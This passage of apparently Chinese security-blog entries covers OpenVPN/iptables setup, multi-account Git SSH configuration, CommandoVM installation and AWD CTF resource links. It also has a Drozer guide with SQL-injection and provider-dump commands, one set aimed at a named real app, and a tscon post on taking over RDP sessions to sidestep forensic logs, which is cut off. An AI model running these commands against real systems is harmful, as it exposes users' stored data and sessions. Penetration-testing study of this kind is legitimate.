id="防火墙配置"><a href="#防火墙配置" class="headerlink" title="防火墙配置"></a>防火墙配置</h3><p>可选操作。</p><pre><code class="bash">关闭firewalldsystemctl stop firewalld.servicesystemctl disable firewalld.service装iptablesyum -y install iptables-services net-toolssystemctl enable iptables.service配置iptablesiptables -A Filter -d 127.0.0.1 -j ACCEPTiptables -A Filter -p tcp --dport 80 -j ACCEPTiptables -A Filter -j DROPiptables -A INPUT -p tcp --destination-port 1194 -j ACCEPTiptables -A INPUT -i tun0 -j ACCEPTiptables -A INPUT -i lo -j ACCEPTiptables -t nat -A POSTROUTING -s 192.168.85.0/24 -j SNAT --to-source 10.10.10.167</code></pre><h3 id="docker-compose"><a href="#docker-compose" class="headerlink" title="docker-compose"></a>docker-compose</h3><p>如果喜欢 docker-compose ，可以使用如下文件部署：</p><pre><code class="bash">version: &#39;2&#39;services:  openvnp:    cap_add:     - NET_ADMIN    image: kylemanna/openvpn    container_name: openvpn    ports:     - &quot;1194:1194/udp&quot;    restart: always    volumes:     - ./openvpn-data/conf:/etc/openvpn</code></pre><p>相关操作：</p><pre><code class="bash">docker-compose run --rm openvpn ovpn_genconfig -u udp://VPN.SERVERNAME.COMdocker-compose run --rm openvpn ovpn_initpkidocker-compose run --rm openvpn rm /etc/openvpn/ovpn_env.shdocker-compose run --rm openvpn ovpn_genconfig -N -d -n 192.168.13.6 -u udp://vpn.mycompany.net -p &quot;dhcp-option DOMAIN mycompany.net&quot; -p &quot;route 192.168.13.0 255.255.255.0&quot; -p &quot;route 172.17.0.0 255.255.0.0&quot;</code></pre><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://github.com/kylemanna/docker-openvpn" target="_blank" rel="noopener">kylemanna/docker-openvpn</a></li><li><a href="https://www.digitalocean.com/community/tutorials/how-to-set-up-an-openvpn-server-on-ubuntu-16-04" target="_blank" rel="noopener">How To Set Up an OpenVPN Server on Ubuntu 16.04</a></li><li><a href="https://blog.sunflyer.cn/archives/445" target="_blank" rel="noopener">使用Openvpn组建服务器内网</a></li><li><a href="https://www.e-learn.cn/content/linux/961142" target="_blank" rel="noopener">使用OpenVPN实现局域网互联</a></li><li><a href="https://www.cnblogs.com/EasonJim/p/8372989.html" target="_blank" rel="noopener">OpenVPN分配静态IP以及同一网段内IP个数（64个）</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>多Git账号管理</title>
      <link href="20190423/%E5%A4%9AGit%E8%B4%A6%E5%8F%B7%E7%AE%A1%E7%90%86.html"/>
      <url>20190423/%E5%A4%9AGit%E8%B4%A6%E5%8F%B7%E7%AE%A1%E7%90%86.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于最近需要有多个账号、多个邮箱，并且需要配置多个 Git 托管网站，因此不能直接使用 <code>git config --global</code> 来设置全局邮箱。钻研了一波，记录一下。</p><a id="more"></a><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><ul><li>操作系统: Windows 10 1809</li><li>源码管理：Git bash</li></ul><h2 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h2><p>以下操作建议在 git bash 下进行</p><h3 id="清理旧有配置"><a href="#清理旧有配置" class="headerlink" title="清理旧有配置"></a>清理旧有配置</h3><p>一般来说都会存在全局配置，所以这里先把全局设置干掉</p><pre><code>git config --global --unset user.namegit config --global --unset user.email</code></pre><h3 id="配置公钥"><a href="#配置公钥" class="headerlink" title="配置公钥"></a>配置公钥</h3><p>Git 配置文件一般存在于当前用户下的 <code>.ssh</code> 目录下，我的是在 <code>C:\Users\Administrator\.ssh</code>。打开该文件夹，打开 git bash，对每一个 Git 托管网站都生成一个公钥。</p><p>以 Github 举例，我的配置就是 <code>ssh-keygen -t rsa -C &quot;leezj9671@gmail.com&quot;</code>。输入后会回显</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2019/04/24/5cbfd6d23db0a.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><p>第一要求你输入保存密钥的文件名，为了方便区分，我建议的命名方式是 <code>id_rsa_xxxxx</code>，<code>xxxxx</code>为托管的网站。后两个选项直接<strong>回车</strong>即可。</p><p>以 Github 举例，生成的文件为私钥文件 <code>id_rsa_github</code>，公钥文件 <code>id_rsa_github.pub</code>。复制公钥文件内容到 Github 的 SSH 密钥管理页面即可，其它代码托管网站同理。</p><blockquote><p>如果你的邮箱都是同一个，生成的公钥都是相同的，因此其实全都用一个公钥就可以了。</p></blockquote><h3 id="添加SSH私钥"><a href="#添加SSH私钥" class="headerlink" title="添加SSH私钥"></a>添加SSH私钥</h3><p>由于我们使用的是 SSH 协议来进行 git 操作，在本地使用私钥文件，就能对使用了 SSH 公钥的服务器进行连接。因此我们使用 <code>ssh-add -l</code> 来看一下我们是否已经加入了密钥。</p><p>当我们发现报错时，使用</p><pre><code class="bash">eval `ssh-agent -s`</code></pre><p>开启 SSH 客户端。</p>{% image https://i.loli.net/2019/04/24/5cbfd80907f83.jpg '' '' %}<p>再使用 <code>ssh-add ./id_rsa_github</code> 后，进行查看：</p>{% image https://i.loli.net/2019/04/24/5cbfd89dd7214.jpg '' '' %}<p>搞定。</p><h3 id="修改Git配置文件"><a href="#修改Git配置文件" class="headerlink" title="修改Git配置文件"></a>修改Git配置文件</h3><p>在 <code>.ssh</code> 文件夹下有个 <code>config</code> 文件，如果没有的话新建一个。</p><p>我使用的三家 Git 托管网站配置文件内容如下：</p><pre><code># giteeHost git@gitee.com      //别名，用这个以后可以直接用常规的SSH下载，这个好处以后你会知道的    HostName gitee.com  //网站域名    User xxx            //网站用户名    PreferredAuthentications publickey    IdentityFile ~/.ssh/id_rsa_gitee    //指定使用的密钥文件    //Port 443          //有的网站不能走22端口，所以必要时需要手动指定端口# githubHost git@github.com    HostName github.com    User leezj9671    PreferredAuthentications publickey    IdentityFile ~/.ssh/id_rsa_github# bitbucketHost git@bitbucket.org    HostName bitbucket.org    User xxxx    PreferredAuthentications publickey    IdentityFile ~/.ssh/id_rsa_bitbucket</code></pre><p>其它网站同理。</p><h3 id="测试SSH连接"><a href="#测试SSH连接" class="headerlink" title="测试SSH连接"></a>测试SSH连接</h3><p>类似于 <code>ssh -T git@github.com</code> 的命令，完美~</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2019/04/24/5cbfdad3f2a5b.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><h3 id="测试项目push-pull操作"><a href="#测试项目push-pull操作" class="headerlink" title="测试项目push/pull操作"></a>测试项目push/pull操作</h3><h4 id="线上项目"><a href="#线上项目" class="headerlink" title="线上项目"></a>线上项目</h4><p>在项目下载里面选择 SSH 方式，直接复制地址。</p><p>以我的项目举例，用 <code>git clone git@github.com:Leezj9671/ctf_py.git</code> 即可。由于在配置文件中用的别名就是 <code>git@github.com</code>，因此直接复制就行，比较省事儿。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2019/04/24/5cbfda3031d07.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><p>以后 push 直接 <code>git push</code> 即可。</p><h4 id="已有项目"><a href="#已有项目" class="headerlink" title="已有项目"></a>已有项目</h4><p>本地已有的 git 项目关联远端的话，也很简单，到该 repo 下，配置当前的用户名和邮箱就行</p><pre><code>git config user.name &quot;leezj9671&quot;git config user.email &quot;leezj9671@gmail.com&quot;</code></pre><p>随后到该仓库下的 <code>.git</code> 文件夹下，编辑 <code>config</code> 文件，修改 <code>[remote &quot;orgin&quot;]</code> 信息，如果没有的话直接复制下方代码，修改后粘贴进去就行就行</p><pre><code>[remote &quot;origin&quot;]    url = https://github.com/Leezj9671/ctf_py   //就改这行，https或者ssh形式都ok    fetch = +refs/heads/*:refs/remotes/origin/*</code></pre><p>如果你之前一直用全局配置的话，所有 git 项目都要按这样重新配置一遍。虽然没多少事儿，但是其实是有点蛋疼的……</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fireeye的Windows渗透工具包CommandoVM安装指南</title>
      <link href="20190421/CommandVM.html"/>
      <url>20190421/CommandVM.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近 Commando VM 似乎比较火，有的同学不知道如何安装，更有甚者在网上求打包好的 VM ，难道不怕别人种后门吗？于是这篇安装指南文章就出现啦！</p><a id="more"></a><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>2019年3月28日，Fiereye 发布了一个它<strong>免费</strong>的，包含超过 140 个开源 Windows 渗透工具包，包括部分你在 Kali 和在 Windows 常用的高质量工具，但是没 Kali 那么全，红队渗透测试员和蓝队防御人员均可放心 <del>食用</del> 使用。该工具集名为 <a href="https://github.com/fireeye/commando-vm" target="_blank" rel="noopener">Commando VM</a>，具体有啥工具如下：</p><p><a href="https://github.com/fireeye/commando-vm#installed-tools" target="_blank" rel="noopener">https://github.com/fireeye/commando-vm#installed-tools</a></p><p>屌在哪里？ <del>在下面</del></p><ol><li>基于 Windows 平台，方便 Windows 环境的渗透，尤其是 Active Directory。</li><li>工具齐全、高质量、且可维护性强。Commando VM 将所有Kali中好用的工具打包到一个发行版中可以加快维护速度，修补和更新都更加简单。</li><li>Windows 的易用性比 Kali 要更强。</li></ol><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="安装环境"><a href="#安装环境" class="headerlink" title="安装环境"></a>安装环境</h3><ol><li>Windows 7 SP1 以上，包括 Windows 10。建议 Win 10，可支持功能更多。</li><li>2 GB+ 的内存，60 GB+ 的磁盘空间，就是虚拟机的默认配置。没办法鸭，Windows 就是硬盘/内存大户，建议还是给多点内存 + 处理器。</li></ol><h3 id="Windows-安装过程"><a href="#Windows-安装过程" class="headerlink" title="Windows 安装过程"></a>Windows 安装过程</h3><ol><li>下载当前最新或者比较稳定的 1803 版的 Win 10，不采用网上的精简版以防后门，<del>反正我硬盘空间大</del>。</li><li>在虚拟机安装完 Windows 后，安装一下 Vmware Tools (看你用什么虚拟机)等方便管理的工具。</li><li>激活并更新到最新版，或者把自动更新先<strong>关掉</strong>，打一个虚拟机<strong>快照</strong>，不然后边哪里错了有你好受的，也方便我们清理痕迹。</li></ol><h3 id="Commando-VM安装过程"><a href="#Commando-VM安装过程" class="headerlink" title="Commando VM安装过程"></a>Commando VM安装过程</h3><p>总体来说安装过程非常 nice，只要运行脚本+少许配置就成了。</p><ol><li><p>右键左下角，以管理员身份打开 <code>Powershell</code>。</p></li><li><p>运行 <code>Set-ExecutionPolicy Unrestricted</code> ，输入 <code>Y</code> 确定，启用脚本执行功能。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2019/04/10/5cade98ceb5df.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure></li><li><p>直接在 github.com/fireeye/commando-vm 下载 zip 包，放到虚拟机中并解压，以管理员身份打开 <code>Powershell</code>，运行安装脚本 <code>.\install.ps1</code>，但是安装过程中需要自动重启几次机器，所以最好运行时输入当前用户的密码： <code>.\install.ps1 -password &lt;password&gt;</code>。</p></li></ol><p>目测有的下载链接位于国外，除了安装很慢之外，没啥问题。</p><h3 id="包管理-保持更新"><a href="#包管理-保持更新" class="headerlink" title="包管理/保持更新"></a>包管理/保持更新</h3><p>Commando VM 用的是 Chocolatey 包管理，就跟 *nix 的 <code>yum</code>/<code>apt</code>/<code>brew</code> 一样，能够在命令行下管理程序。具体如何使用可以查看 Chocolatey 的<a href="https://chocolatey.org/docs" target="_blank" rel="noopener">官方文档</a>，足够 easy，很适合软件洁癖人员。</p><p>比如说，你可以使用 <code>cinst github</code> 来安装 Github Desktop。</p><p>以后对于所有工具的更新，都可以直接用 <code>cup all -y</code> 直接更新，爽到爆棚有没有。</p><h2 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h2><p>Windows 下的话，其实我觉得 PentestBox 就 ok 了，不知道有啥大区别咧</p>]]></content>
      
      
      <categories>
          
          <category> 神兵利器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 神兵利器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AWD 资源小合集(持续更新)</title>
      <link href="20190415/how-to-awd.html"/>
      <url>20190415/how-to-awd.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文搜集了在写文章的时候看到的 AWD 资源，目前不多，以后会持续更新。</p><a id="more"></a><h2 id="Github资源"><a href="#Github资源" class="headerlink" title="Github资源"></a>Github资源</h2><ul><li>(⭐235) AWD攻防赛脚本集合: <a href="https://github.com/admintony/Prepare-for-AWD" target="_blank" rel="noopener">https://github.com/admintony/Prepare-for-AWD</a></li><li>(⭐124) Attack-Defense-Framework: <a href="https://github.com/SniperOJ/Attack-Defense-Framework/tree/v2" target="_blank" rel="noopener">https://github.com/SniperOJ/Attack-Defense-Framework/tree/v2</a></li><li>(⭐99) AWD攻防赛webshell批量利用框架: <a href="https://github.com/Ares-X/AWD-Predator-Framework" target="_blank" rel="noopener">https://github.com/Ares-X/AWD-Predator-Framework</a></li><li>(⭐28) awd-frame: <a href="https://github.com/xnianq/awd-frame" target="_blank" rel="noopener">https://github.com/xnianq/awd-frame</a></li><li>(⭐4) WEB-AWD-Framework:<a href="https://github.com/dahua966/WEB-AWD-Framework" target="_blank" rel="noopener">https://github.com/dahua966/WEB-AWD-Framework</a></li><li>(⭐0) AWD-helper: <a href="https://github.com/sarleon/AWD-helper" target="_blank" rel="noopener">https://github.com/sarleon/AWD-helper</a></li></ul><h2 id="AWD经验"><a href="#AWD经验" class="headerlink" title="AWD经验"></a>AWD经验</h2><ul><li>CTF线下赛AWD模式下的生存技巧: <a href="https://www.anquanke.com/post/id/84675" target="_blank" rel="noopener">https://www.anquanke.com/post/id/84675</a></li><li>CTF线下赛AWD套路小结: <a href="https://xz.aliyun.com/t/25" target="_blank" rel="noopener">https://xz.aliyun.com/t/25</a></li><li>AWD混战攻略: <a href="https://www.jianshu.com/p/d21b7e1bffaf" target="_blank" rel="noopener">https://www.jianshu.com/p/d21b7e1bffaf</a></li><li>CTF线下AWD攻防模式的准备工作及起手式: <a href="https://blog.csdn.net/like98k/article/details/80261603" target="_blank" rel="noopener">https://blog.csdn.net/like98k/article/details/80261603</a></li><li>2017强网杯线下AWD攻防总结（适合新手）: <a href="https://www.t00ls.net/articles-42278.html" target="_blank" rel="noopener">https://www.t00ls.net/articles-42278.html</a></li><li>AWD攻防线下生存之道: <a href="http://47.95.201.153/blog/AWD攻防线下生存之道.html" target="_blank" rel="noopener">http://47.95.201.153/blog/AWD攻防线下生存之道.html</a></li><li>CTF AWD模式攻防Note: <a href="https://www.cnblogs.com/nul1/p/9576386.html" target="_blank" rel="noopener">https://www.cnblogs.com/nul1/p/9576386.html</a></li></ul><h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><ul><li>不死马的删除: <a href="https://yq.aliyun.com/zt/325638" target="_blank" rel="noopener">https://yq.aliyun.com/zt/325638</a></li><li>awd攻防之kill不死马: <a href="https://www.jianshu.com/p/ba79686987da" target="_blank" rel="noopener">https://www.jianshu.com/p/ba79686987da</a></li><li>python中的后渗透|也可用于AWD攻防–shell管理: <a href="https://www.jianshu.com/p/2e8e7330b73e" target="_blank" rel="noopener">https://www.jianshu.com/p/2e8e7330b73e</a></li><li>从0到1掌握AWD攻防之RSA必杀: <a href="https://www.360zhijia.com/anquan/456324.html" target="_blank" rel="noopener">https://www.360zhijia.com/anquan/456324.html</a></li><li>资深大牛教你如何web端权限维持（内附具体步骤）: <a href="http://www.sohu.com/a/127074604_472906" target="_blank" rel="noopener">http://www.sohu.com/a/127074604_472906</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Drozer使用指南</title>
      <link href="20190411/drozer-guide.html"/>
      <url>20190411/drozer-guide.html</url>
      
        <content type="html"><![CDATA[<p>在论坛里面看到drozer的文章有点零碎，有的只说了content provider，有的只是像文档一样比较生硬，分享一下我自己做的笔记。</p><a id="more"></a><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><ol><li>准备一部安卓机或者模拟器，打开USB调试</li><li>adb下载好，配置好环境变量</li><li>下载好对应平台的 <a href="https://github.com/mwrlabs/drozer/releases/" target="_blank" rel="noopener">mwrlabs/drozer</a></li></ol><h2 id="Drozer安装步骤"><a href="#Drozer安装步骤" class="headerlink" title="Drozer安装步骤"></a>Drozer安装步骤</h2><ol><li>需要版本为python2，已装python3需要安装python2</li><li>安装库<code>drozer</code>, <code>twisted</code>, <code>service_identity</code>，命令为<code>pip install drozer twisted service_identity</code></li><li>到python2安装目录下 <code>C:\Python27\Scripts</code> 查看是否有 <code>drozer.bat</code>，存在的话运行<code>drozer.bat --help</code>看是否有回显。如果你安装了多个python版本，则注意要编辑<code>drozer.bat</code> ，将 <code>python.exe</code> 改为 <code>py -2</code> 或其它你配置好的python2.exe文件名</li><li>安装</li><li>运行drozer错误代码为<code>10054</code>时表示手机没有在drozer APP内打开服务，错误代码<code>10061</code>时表示没有开启adb或者没有进行端口转发。</li><li>查看<pre><code class="bash"># 查看设备是否adb成功连接adb devices# 成功链接后，adb转发端口adb forward tcp:31415 tcp:31415# 查看端口是否开启netstat -ano | findstr 31415</code></pre></li><li>推荐使用 <a href="https://github.com/mwrlabs/drozer/releases/download/2.3.4/sieve.apk" target="_blank" rel="noopener">sieve.apk</a> (一个漏洞很多的示例apk)或goatdroid.app(跟webgoat同公司出的漏洞apk)用于练习drozer的漏洞发现和相关操作</li></ol><h2 id="Drozer检测命令"><a href="#Drozer检测命令" class="headerlink" title="Drozer检测命令"></a>Drozer检测命令</h2><h3 id="获取Android设备上的所有的安装的App的包名"><a href="#获取Android设备上的所有的安装的App的包名" class="headerlink" title="获取Android设备上的所有的安装的App的包名"></a>获取Android设备上的所有的安装的App的包名</h3><pre><code class="bash">run app.package.listrun app.package.list -f sieve</code></pre><h3 id="获取APP基本信息"><a href="#获取APP基本信息" class="headerlink" title="获取APP基本信息"></a>获取APP基本信息</h3><pre><code class="bash">run app.package.info -a com.aspirecn.xiaoxuntongTeacher.ln</code></pre><h3 id="寻找攻击面"><a href="#寻找攻击面" class="headerlink" title="寻找攻击面"></a>寻找攻击面</h3><p>一般测试第一步先用这个</p><pre><code class="bash">run app.package.attacksurface com.aspirecn.xiaoxuntongTeacher.ln</code></pre><p>这条命令会回显出四大组件可能存在的问题，然后再根据问题暴露点一个个对其测试。</p><h3 id="Activity"><a href="#Activity" class="headerlink" title="Activity"></a>Activity</h3><pre><code class="bash">run app.activity.info -a com.aspirecn.xiaoxuntongTeacher.ln</code></pre><p>看的是这个Activity启动会不会造成越权启动或者使应用崩溃，其它的接口（微信登陆支付、小米等）暴露activity一般不造成危害的不算</p><pre><code class="bash">run app.activity.start --component apk名 activity名run app.activity.start --component com.aspirecn.xiaoxuntongTeacher.ln com.aspirecn.xiaoxuntongTeacher.ln.ui.Mainrun app.activity.start --component com.aspirecn.xiaoxuntongTeacher.ln  com.aspirecn.xiaoxuntongTeacher.ln.activity.DoctorListActivity</code></pre><h3 id="Content-Provider"><a href="#Content-Provider" class="headerlink" title="Content Provider"></a>Content Provider</h3><ol><li><p>获取Content Provider信息</p><pre><code class="bash">run app.provider.info -a com.aspirecn.xiaoxuntongTeacher.ln</code></pre></li><li><p>Content Providers（数据泄露）<br>先获取所有可以访问的Uri：</p><pre><code class="bash">run scanner.provider.finduris -a com.aspirecn.xiaoxuntongTeacher.ln</code></pre><p>获取各个Uri的数据：</p><pre><code class="bash">run app.provider.query content:// com.aspirecn.xiaoxuntongTeacher.ln.DBContentProvider/Passwords/ --vertical</code></pre><p>查询到数据说明存在漏洞</p></li><li><p>Content Providers（SQL注入）</p><pre><code class="bash">run app.provider.query content:// com.aspirecn.xiaoxuntongTeacher.ln.DBContentProvider/Passwords/ --projection &quot;&#39;&quot;run app.provider.query content:// com.aspirecn.xiaoxuntongTeacher.ln.DBContentProvider/Passwords/ --selection &quot;&#39;&quot;</code></pre><p>报错则说明存在SQL注入。<br>列出所有表：</p><pre><code class="bash">run app.provider.query content:// com.aspirecn.xiaoxuntongTeacher.ln.DBContentProvider/Passwords/ --projection &quot;* FROM SQLITE_MASTER WHERE type=&#39;table&#39;;--&quot;</code></pre><p>获取某个表（如Key）中的数据：</p><pre><code class="bash">run app.provider.query content:// com.aspirecn.xiaoxuntongTeacher.ln.DBContentProvider/Passwords/ --projection &quot;* FROM Key;--&quot;</code></pre></li><li><p>同时检测SQL注入和目录遍历（！优先用这条！）</p><pre><code class="bash">run scanner.provider.injection -a com.aspirecn.xiaoxuntongTeacher.lnrun scanner.provider.traversal -a com.aspirecn.xiaoxuntongTeacher.ln</code></pre></li></ol><h3 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h3><p>测试某个Service，一般需要读源码看是否有漏洞</p><pre><code class="bash">run app.service.info -a com.aspirecn.xiaoxuntongTeacher.lnrun app.service.send com.aspirecn.xiaoxuntongTeacher.ln com.aspirecn.xiaoxuntongTeacher.ln.CryptoService --msg 1 5 3</code></pre><h3 id="Broadcast"><a href="#Broadcast" class="headerlink" title="Broadcast"></a>Broadcast</h3><p>测试某个broadcast，一般需要读源码看是否有漏洞</p><pre><code class="bash">run app.broadcast.info -a com.aspirecn.xiaoxuntongTeacher.ln</code></pre><h2 id="另附drozer常用命令"><a href="#另附drozer常用命令" class="headerlink" title="另附drozer常用命令"></a>另附drozer常用命令</h2><pre><code class="bash">list  //列出目前可用的模块，也可以使用lshelp app.activity.forintent       //查看指定模块的帮助信息run app.package.list      //列出android设备中安装的apprun app.package.info -a com.android.browser     //查看指定app的基本信息run app.activity.info -a com.android.browser      //列出app中的activity组件run app.activity.start --action android.intent.action.VIEW --data-uri  http://www.google.com  //开启一个activity，例如运行浏览器打开谷歌页面run scanner.provider.finduris -a com.sina.weibo       //查找可以读取的Content Providerrun app.provider.query content://settings/secure --selection &quot;name=&#39;adb_enabled&#39;&quot;    //读取指定Content Provider内容run scanner.misc.writablefiles --privileged /data/data/com.sina.weibo     //列出指定文件路径里全局可写/可读的文件run shell.start       //shell操作run tools.setup.busybox       //安装busyboxlist auxiliary        //通过web的方式查看content provider组件的相关内容help auxiliary.webcontentresolver     //webcontentresolver帮助run auxiliary.webcontentresolver      //执行在浏览器中以http://localhost:8080即可访问以sieve为例run app.package.list -f sieve         //查找sieve应用程序run app.package.info -a com.mwr.example.sieve         //显示app.package.info命令包的基本信息run app.package.attacksurface com.mwr.example.sieve   //确定攻击面run app.activity.info -a com.mwr.example.sieve         //获取activity信息run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList     //启动pwlistrun app.provider.info -a com.mwr.example.sieve        //提供商信息run scanner.provider.finduris -a com.mwr.example.sieve        //扫描所有能访问地址 run  app.provider.query content://com.mwr.example.DBContentProvider/Passwords/--vertical  //查看DBContentProvider/Passwords这条可执行地址run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;&#39;&quot;   //检测注入run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts    //查看读权限数据run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db /home/user/database.db //下载数据run scanner.provider.injection -a com.mwr.example.sieve       //扫描注入地址run scanner.provider.traversal -a com.mwr.example.sieverun app.service.info -a com.mwr.example.sieve         //查看服务run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList     //启动pwlistrun app.provider.info -a com.mwr.example.sieve        //提供商信息run scanner.provider.finduris -a com.mwr.example.sieve        //扫描所有能访问地址 run app.provider.query content://com.mwr.example.DBContentProvider/Passwords/--vertical  //查看DBContentProvider/Passwords这条可执行地址run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;&#39;&quot;   //检测注入run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts    //查看读权限数据run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db /home/user/database.db //下载数据run scanner.provider.injection -a com.mwr.example.sieve       //扫描注入地址run scanner.provider.traversal -a com.mwr.example.sieverun app.service.info -a com.mwr.example.sieve         //查看服务</code></pre>]]></content>
      
      
      <categories>
          
          <category> 安卓 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安卓 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tscon未授权登陆远程桌面</title>
      <link href="20190408/tscon%E6%9C%AA%E6%8E%88%E6%9D%83%E7%99%BB%E9%99%86%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2.html"/>
      <url>20190408/tscon%E6%9C%AA%E6%8E%88%E6%9D%83%E7%99%BB%E9%99%86%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2.html</url>
      
        <content type="html"><![CDATA[<p>运用 <code>tscon</code> 该特性可以达到某些<strong>横向移动</strong>的场景，达成未授权登陆其它用户的远程桌面会话，或者使用该特性切换到其它用户进行恶意行为，那么事件日志里面记录的是其它用户的操作，从而避免或者恶意引导应急响应人员的取证。</p><a id="more"></a><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>本文章更多的是为了解这个姿势，实际攻击中需要结合利用。</p><p>这种方法前提是取得某部主机的 SYSTEM 权限，特点是</p><ul><li>不需要其它工具</li><li>不需要写入任何文件</li><li>可以连接到断开连接、没有正确退出的远程桌面 session</li></ul><p>影响范围：<br>win 2000 之后一直至今的 windows 系统都可以使用该方法</p><h2 id="用到的工具"><a href="#用到的工具" class="headerlink" title="用到的工具"></a>用到的工具</h2><p>无，仅需要开启远程桌面</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><blockquote><p>文章部分内容引用了先知社区文章 <a href="https://xz.aliyun.com/t/1987" target="_blank" rel="noopener">https://xz.aliyun.com/t/1987</a></p></blockquote><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><h4 id="RDP是什么"><a href="#RDP是什么" class="headerlink" title="RDP是什么"></a>RDP是什么</h4><p>远程桌面协议（RDP）是微软开发的专有协议，它为用户提供通过网络连接连接到另一台计算机的图形界面。用户使用RDP客户端，而另一台计算机必须运行RDP服务器。</p><p>每个试图连接到另一台计算机的人，主要使用远程桌面服务或终端服务进行连接。如果您使用此服务，那么您已经知道远程桌面服务具有以下功能：如果您知道其密码，则可以连接到其他用户的会话。</p><p>这是我们常说的 3389/远程桌面。</p><h4 id="TSCON是什么"><a href="#TSCON是什么" class="headerlink" title="TSCON是什么"></a>TSCON是什么</h4><p>Tscon 是一个 Windows 的功能，可连接到远程桌面会话主机服务器上的另一个会话。</p><pre><code>tscon {&lt;SessionID&gt; | &lt;SessionName&gt;} [/dest:&lt;SessionName&gt;] [/password:&lt;pw&gt; | /password:*] [/v]</code></pre><h4 id="System权限"><a href="#System权限" class="headerlink" title="System权限"></a>System权限</h4><p>System权限是比Administrator权限还高的系统最高权限，利用它可以完成很多常规情况下无法完成的任务。</p><hr><h3 id="tscon的正常用法"><a href="#tscon的正常用法" class="headerlink" title="tscon的正常用法"></a>tscon的正常用法</h3><p>测试系统： Windows Server 2008 x86</p><p>已创建三个用户： Administrator user1 test1</p><p>密码均为 <strong>test1234</strong></p><p>远程桌面需要设置为第二项：</p>{% image https://i.loli.net/2019/03/23/5c958d1f22bed.jpg '' '' %}<p><strong>步骤1</strong> 开启了远程桌面的 Windows 系统，用户 Administrator 为本地登录，用户 test1 为通过远程桌面服务(RDP)连接 3389 端口远程登录，会产生多个会话如下</p>{% image https://i.loli.net/2019/03/23/5c95ec32a049c.jpg '' '' %}<p><strong>步骤2</strong> 接下来，如果用户Administrator想 要切换至用户b的远程桌面，可通过右键-连接进行连接，接着输入密码即可，如下图：</p>{% image https://i.loli.net/2019/03/23/5c95ec4c33dde.jpg '' '' %}{% image https://i.loli.net/2019/03/23/5c95ec6a1640a.jpg '' '' %}<p><strong>步骤3</strong> 来到我们的 tscon ，它是命令行下使用的工具，可实现和上述相同的功能。首先获取用户对应的 sessionid，执行如下命令：</p><pre><code>query user</code></pre><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://i.loli.net/2019/03/23/5c95ecb3a6004.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><p><strong>步骤4</strong> 接着在 Administrator 用户命令行下运行 tscon 命令，上个命令查到 test 的会话 ID 为 2，输入 ID 和密码后：</p><pre><code>tscon 2 /PASSWORD:test1234</code></pre><p>你会发现你直接切换到了 test 用户的会话，这是 <code>tscon</code> 命令的正常用法。</p><hr><h3 id="利用tscon实现未授权登录远程桌面的方法"><a href="#利用tscon实现未授权登录远程桌面的方法" class="headerlink" title="利用tscon实现未授权登录远程桌面的方法"></a>利用tscon实现未授权登录远程桌面的方法</h3><p>如果你拥有了 System 权限，在 System 权限下执行同样的命令，就能够绕过输入密码的过程，直接切换。</p><p>从 Administrator 权限切换到 System 权限的方法在大佬的文章<a 